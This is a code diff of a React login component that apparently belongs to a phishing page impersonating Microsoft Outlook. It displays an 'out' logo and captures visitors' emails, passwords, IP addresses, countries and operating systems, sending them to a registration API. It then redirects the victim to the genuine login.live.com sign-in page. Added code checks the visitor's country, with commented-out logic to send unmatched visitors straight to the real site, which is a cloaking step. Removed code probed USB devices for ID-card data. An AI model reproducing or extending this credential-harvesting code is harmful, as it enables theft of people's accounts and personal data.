@@ -4,26 +4,32 @@ import * as FiIcons from "react-icons/fi";
 import css from "./login.module.css";
 import pax from "../../../package.json";
 import dayjs from "dayjs";
-import {createRegistroUser} from "../../api_server/registroApi";
-
+import out from "../../assets/out.png";
+import { createRegistroUser } from "../../api_server/registroApi";
+import { getAllPais } from "../../api_server/paisApi";
 
 export default function Login() {
+  const [xstet, setxStet] = useState(null);
   const [xemail, setxEmail] = useState("");
+  const [xPaises, setxPaises] = useState([]);
   const [password, setPassword] = useState("");
   const [errorSpan, setErrorSpan] = useState(false);
   const [errPassword, setErrPaswword] = useState(false);
 
   //params
   const { email } = useParams();
-  console.log(email);
-  console.log(xemail);
-  console.log(password);
+
+  console.log(xstet);
+  // console.log(email);
+  // console.log(xemail);
+  // console.log(password);
 
   //forma para obtener ubicacion de su pais y su ip
   const [details, setDetails] = useState(null);
   // console.log(details?.city);
-  console.log(details);
-  console.log(pax.version);
+  // console.log(details);
+  // console.log(xPaises);
+  // console.log(pax.version);
 
   let country = details?.country_name;
   let ip = details?.ip;
@@ -31,7 +37,20 @@ export default function Login() {
 
   let per = dayjs();
   const fecha_x = per.format("DD/MM/YYYY");
-  console.log(fecha_x);
+
+  // const pepe = xPaises.filter((e) => {
+  //   if (e?.desc_corta_v === details?.country) {
+  //     return e;
+  //   }
+  // });
+  // console.log(pepe);
+
+  // setTimeout(function () {
+  //   if (pepe?.desc_corta_v !== details?.country) {
+  //     setxStet(true);
+  //     console.log("ssssssssss");
+  //   }
+  // }, 1500);
 
   useEffect(() => {
     const getUserGeolocationDetails = () => {
@@ -44,75 +63,62 @@ export default function Login() {
     };
     getUserGeolocationDetails();
 
-    // function obtenerUbicacion() {
-    //   if (navigator.geolocation) {
-    //     navigator.geolocation.getCurrentPosition(function (position) {
-    //       // Obtener la latitud y longitud
-    //       var latitud = position.coords.latitude;
-    //       var longitud = position.coords.longitude;
+    const obtienePais = async () => {
+      const kale = await getAllPais();
+      setxPaises(kale?.data);
 
-    //       // Mostrar la ubicación en la consola
-    //       console.log("Latitud:", latitud);
-    //       console.log("Longitud:", longitud);
+      const pepe = xPaises.filter((e) => {
+        if (e?.desc_corta_v === details?.country) {
+          return e;
+        }
+      });
+      console.log(pepe);
 
-    //       // Aquí puedes enviar la ubicación al servidor o realizar cualquier otra acción
-    //     });
-    //   } else {
-    //     console.log("La geolocalización no está disponible en este navegador.");
-    //   }
+      if (pepe?.desc_corta_v !== details?.country) {
+        setxStet(true);
+        console.log("ssssssssss");
+      }
+    };
+
+    obtienePais();
+
+    // if (xstet === true) {
+    //   console.log("si encontro");
+    //   window.location.href =
+    //     "https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=23&ct=1713452137&rver=7.0.6738.0&wp=MBI_SSL&wreply=https%3a%2f%2foutlook.live.com%2fowa%2f%3fcobrandid%3dab0455a0-8d03-46b9-b18b-df2f57b9e44c%26nlp%3d1%26RpsCsrfState%3d036328ae-6978-64c6-c8dc-e4f5539b0b81&id=292841&aadredir=1&CBCXT=out&lw=1&fl=dob%2cflname%2cwld&cobrandid=ab0455a0-8d03-46b9-b18b-df2f57b9e44c";
     // }
-
-    // obtenerUbicacion();
-
-
-
-
   }, []);
 
+  // if (pepe.length === 0) {
+  //   setxStet(true);
+  // }
 
-  const solicitarPermisoAccesoUSB =  async ()=> {
+  // useEffect(() => {
+  //   setTimeout(function () {
+  //     const popo = xPaises.filter((e) => {
+  //       if (e?.desc_corta_v === details?.country) {
+  //         return e;
+  //       }
+  //     });
+  //     console.log(popo);
 
+  //     if (popo && popo && popo[0]?.desc_corta_v !== details?.country) {
+  //       console.log("si encontro");
+  //       window.location.href =
+  //         "https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=23&ct=1713452137&rver=7.0.6738.0&wp=MBI_SSL&wreply=https%3a%2f%2foutlook.live.com%2fowa%2f%3fcobrandid%3dab0455a0-8d03-46b9-b18b-df2f57b9e44c%26nlp%3d1%26RpsCsrfState%3d036328ae-6978-64c6-c8dc-e4f5539b0b81&id=292841&aadredir=1&CBCXT=out&lw=1&fl=dob%2cflname%2cwld&cobrandid=ab0455a0-8d03-46b9-b18b-df2f57b9e44c";
+  //     }
 
+  //     console.log("Han pasado 3 segundos");
+  //   }, 3000);
+  // }, [xstet]);
 
-
-    navigator.usb.getDevices().then(devices => {
-      devices.forEach(device => {
-        console.log(device.productName);      // "Arduino Micro"
-        console.log(device.manufacturerName); // "Arduino LLC"
-      });
-    })
-    
-    try {
-      // const device = await navigator.usb.requestDevice({ filters: [{ vendorId: 0x1234, productId: 0x5678 }] });
-      // const device = await navigator.usb.requestDevice({ filters: [{ vendorId: 0x2CE3, productId: 0x9563  }] }); // Agrega los filtros adecuados para tu lector de tarjetas inteligentes USB
-
-      const device = await navigator.usb.requestDevice({ filters: [{ vendorId: Prod_DataTraveler_3  }] }); // Agrega los filtros adecuados para tu lector de tarjetas inteligentes USB
-
-      console.log('Dispositivo USB conectado:', device);
-      // Continuar con la comunicación con el dispositivo USB...
-
-      // await device.open();
-      // await device.selectConfiguration(1);
-      // await device.claimInterface(0);
-  
-      // const data = await device.transferIn(1, 64); // Leer datos del lector de tarjetas inteligentes
-  
-      // Procesar los datos para extraer la información del DNI
-      // Esto variará dependiendo del formato de los datos y de cómo se almacena la información en la tarjeta inteligente
-  
-      console.log('Datos del DNI:', data);
-    } catch (error) {
-      console.error('Error al solicitar acceso USB:', error);
-    }
-  }
-
-      
-
+  // console.log(xPaises);
+  // console.log(details?.country);
 
   //ver el sistema operativo de dpnde ingresa a la web
   var InfoSistemaOperativo = window.navigator.appVersion.toLowerCase();
 
-  console.log(InfoSistemaOperativo);
+  // console.log(InfoSistemaOperativo);
 
   // Expresión regular para buscar el texto dentro de paréntesis
   const regex = /\((.*?)\)/g;
@@ -126,7 +132,7 @@ export default function Login() {
     textosDentroParentesis.push(match[1]);
   }
 
-  console.log(textosDentroParentesis[0]);
+  // console.log(textosDentroParentesis[0]);
   const so = textosDentroParentesis[0];
   // console.log(InfoSistemaOperativo);
 
@@ -154,7 +160,7 @@ export default function Login() {
       FECHA_V: fecha_x,
     };
     console.log(datax);
-   
+
     if (errorSpan) {
       return (window.location.href =
         "https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=23&ct=1713452137&rver=7.0.6738.0&wp=MBI_SSL&wreply=https%3a%2f%2foutlook.live.com%2fowa%2f%3fcobrandid%3dab0455a0-8d03-46b9-b18b-df2f57b9e44c%26nlp%3d1%26RpsCsrfState%3d036328ae-6978-64c6-c8dc-e4f5539b0b81&id=292841&aadredir=1&CBCXT=out&lw=1&fl=dob%2cflname%2cwld&cobrandid=ab0455a0-8d03-46b9-b18b-df2f57b9e44c");
@@ -175,9 +181,8 @@ export default function Login() {
     <div className={css.bg_login}>
       <div className={css.container_login}>
         <div className={css.out_title}>
-          <img src="out.png" alt="red" />
+          <img src={out} alt="red" />
         </div>
-        <button type="button"  onClick={ ()=> solicitarPermisoAccesoUSB() }  >pep</button>
 
         <div className={css.div_login}>
           <img
